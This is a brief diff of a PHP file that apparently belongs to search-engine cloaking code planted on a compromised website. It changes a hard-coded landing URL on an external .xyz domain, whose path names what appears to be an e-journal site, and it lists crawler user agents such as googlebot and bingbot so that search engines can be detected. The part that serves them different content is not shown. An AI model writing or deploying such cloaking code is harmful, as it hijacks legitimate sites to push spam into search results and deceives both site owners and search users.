@@ -2,7 +2,7 @@
 ob_start();
 header('Vary: Accept-Language, User-Agent');
 
-$bot_url = "https://kompasel.xyz/landing/tjnpr/";
+$bot_url = "https://kacaukaliah.xyz/landing/ejournal.duniakampus/";
 $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
 $bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
